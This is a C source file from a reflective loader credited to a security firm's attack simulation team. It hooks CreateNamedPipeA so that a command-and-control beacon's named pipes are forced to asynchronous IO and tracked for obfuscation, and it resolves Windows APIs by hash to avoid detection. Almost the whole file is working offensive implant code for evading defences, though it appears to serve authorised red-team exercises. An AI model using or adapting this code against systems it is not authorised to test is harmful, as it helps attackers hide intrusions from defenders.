/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

#if defined( _WIN64 )

typedef struct
{
	D_API( RtlInitUnicodeString );
	D_API( CreateNamedPipeA );
	D_API( RtlAllocateHeap );
	D_API( LdrUnloadDll );
	D_API( RtlFreeHeap );
	D_API( LdrLoadDll );
} API ;

/* API Hashes */
#define H_API_RTLINITUNICODESTRING	0xef52b589 /* RtlInitUnicodeString */
#define H_API_CREATENAMEDPIPEA		0xa05e2a6d /* CreateNamedPipeA */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_LDRUNLOADDLL		0xd995c1e6 /* LdrUnloadDll */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */
#define H_API_LDRLOADDLL		0x9e456a43 /* LdrLoadDll */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * If a pipe is not using non-overlapped IO,
 * the pipe will be saved into a list, and
 * forced to be async-IO.
 *
 * The other pipe hooks will attempt to then
 * obfuscate on the handle when performing
 * Read, write, and connect operations.
 *
!*/
D_SEC( D ) HANDLE WINAPI CreateNamedPipeA_Hook( _In_ LPCSTR lpName, _In_ DWORD dwOpenMode, _In_ DWORD dwPipeMode, _In_ DWORD nMaxInstances, _In_ DWORD nOutBufferSize, _In_ DWORD nInBufferSize, _In_ DWORD nDefaultTimeout, _In_ LPSECURITY_ATTRIBUTES lpAttributes )
{
	API			Api;
	UNICODE_STRING		Uni;

	PVOID			K32 = NULL;
	HANDLE			Srv = INVALID_HANDLE_VALUE;
	PTABLE			Tbl = NULL;
	PPIPE_ENTRY_BEACON	Ent = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	Api.RtlInitUnicodeString = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.RtlAllocateHeap      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.LdrUnloadDll         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.RtlFreeHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.LdrLoadDll           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );

	/* Get table pointer */
	Tbl = C_PTR( G_SYM( Table ) );

	/* Load kernel32.dll */
	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"kernel32.dll" ) ) );

	if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &K32 ) ) ) {
		Api.CreateNamedPipeA = PeGetFuncEat( K32, H_API_CREATENAMEDPIPEA );

		/* Is this a non-overlapped IO pipe? */
		if ( !( dwOpenMode & FILE_FLAG_OVERLAPPED ) ) {
			/* Allocate a structure for it */
			if ( ( Ent = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( PIPE_ENTRY_BEACON ) ) ) != NULL ) {
				/* Create a named pipe server with overlapped asny-cIO */
				if ( ( Srv = Api.CreateNamedPipeA( lpName, dwOpenMode | FILE_FLAG_OVERLAPPED, dwPipeMode, nMaxInstances, nOutBufferSize, nInBufferSize, nDefaultTimeout, lpAttributes ) ) != INVALID_HANDLE_VALUE ) {
					/* Save the pipe */
					Ent->Pipe = C_PTR( Srv );

					/* Insert into the list */
					InsertHeadList( &Tbl->Table->PipeList, &Ent->PipeList );
				} else
				{
					/* Free the entry if we failed */
					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ent );
				}
			} else 
			{
				/* Notify we couldnt allocate a structure */
				NtCurrentTeb()->LastErrorValue = ERROR_NOT_ENOUGH_MEMORY;
			};
		} else 
		{
			/* Do not allocate a structure and attempt to create the pipe */
			Srv = Api.CreateNamedPipeA( lpName, dwOpenMode, dwPipeMode, nMaxInstances, nOutBufferSize, nInBufferSize, nDefaultTimeout, lpAttributes );
		};

		/* Dereference */
		Api.LdrUnloadDll( K32 );
	}

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Return */
	return C_PTR( Srv );
};

#endif
